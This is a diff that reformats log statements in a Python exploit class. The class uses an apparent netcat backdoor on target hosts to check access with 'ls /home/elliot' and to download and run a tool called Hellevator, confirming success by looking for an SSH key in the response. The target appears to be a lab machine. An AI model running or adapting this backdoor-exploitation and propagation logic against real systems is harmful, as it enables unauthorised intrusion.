@@ -46,50 +46,32 @@ class BackdoorOneNC(Exploit):
 
             socket_response = self.run_command(command=download_hellevator_command)
             if ssh_key in socket_response:
-                logger.info(
-                    f"{BetterLogger.COLOR_BLUE}{self.ip_address} - Successfully executed Hellevator via BackdoorOneNC!{BetterLogger.COLOR_END}"
-                )
+                logger.info(f"{BetterLogger.COLOR_BLUE}{self.ip_address} - Successfully executed Hellevator via BackdoorOneNC!{BetterLogger.COLOR_END}")
                 return True
-            logger.info(
-                f"{BetterLogger.COLOR_RED}{self.ip_address} - Something went wrong while executing Hellevator via BackdoorOneNC!{BetterLogger.COLOR_END}"
-            )
+            logger.info(f"{BetterLogger.COLOR_RED}{self.ip_address} - Something went wrong while executing Hellevator via BackdoorOneNC!{BetterLogger.COLOR_END}")
             return False
         except PatchedException:
-            logger.info(
-                f"{BetterLogger.COLOR_YELLOW}{self.ip_address} - The target is not vulnerable to BackdoorOneNC.{BetterLogger.COLOR_END}"
-            )
+            logger.info(f"{BetterLogger.COLOR_YELLOW}{self.ip_address} - The target is not vulnerable to BackdoorOneNC.{BetterLogger.COLOR_END}")
             return False
         except Exception as err:
-            logger.info(
-                f"{BetterLogger.COLOR_RED}{self.ip_address} - Something went wrong while executing Hellevator via BackdoorOneNC.{BetterLogger.COLOR_END}"
-            )
+            logger.info(f"{BetterLogger.COLOR_RED}{self.ip_address} - Something went wrong while executing Hellevator via BackdoorOneNC.{BetterLogger.COLOR_END}")
             logger.exception(err)
             return False
 
     def test_if_vulnerable(self):
         try:
-            logger.info(
-                f"{self.ip_address} - Testing if the target is vulnerable to BackdoorOneNC..."
-            )
+            logger.info(f"{self.ip_address} - Testing if the target is vulnerable to BackdoorOneNC...")
             exploit_command = "ls /home/elliot"
             socket_response = self.run_command(command=exploit_command)
             if "Desktop" in socket_response:
-                logger.info(
-                    f"{BetterLogger.COLOR_GREEN}{self.ip_address} - The target is vulnerable to BackdoorOneNC!{BetterLogger.COLOR_END}"
-                )
+                logger.info(f"{BetterLogger.COLOR_GREEN}{self.ip_address} - The target is vulnerable to BackdoorOneNC!{BetterLogger.COLOR_END}")
                 return True
-            logger.info(
-                f"{BetterLogger.COLOR_YELLOW}{self.ip_address} - The target is not vulnerable to BackdoorOneNC.{BetterLogger.COLOR_END}"
-            )
+            logger.info(f"{BetterLogger.COLOR_YELLOW}{self.ip_address} - The target is not vulnerable to BackdoorOneNC.{BetterLogger.COLOR_END}")
             return False
         except PatchedException:
-            logger.info(
-                f"{BetterLogger.COLOR_YELLOW}{self.ip_address} - The target is not vulnerable to BackdoorOneNC.{BetterLogger.COLOR_END}"
-            )
+            logger.info(f"{BetterLogger.COLOR_YELLOW}{self.ip_address} - The target is not vulnerable to BackdoorOneNC.{BetterLogger.COLOR_END}")
             return False
         except Exception as err:
-            logger.info(
-                f"{BetterLogger.COLOR_RED}{self.ip_address} - Something went wrong while checking if BackdoorOneNC is vulnerable.{BetterLogger.COLOR_END}"
-            )
+            logger.info(f"{BetterLogger.COLOR_RED}{self.ip_address} - Something went wrong while checking if BackdoorOneNC is vulnerable.{BetterLogger.COLOR_END}")
             logger.exception(err)
             return False
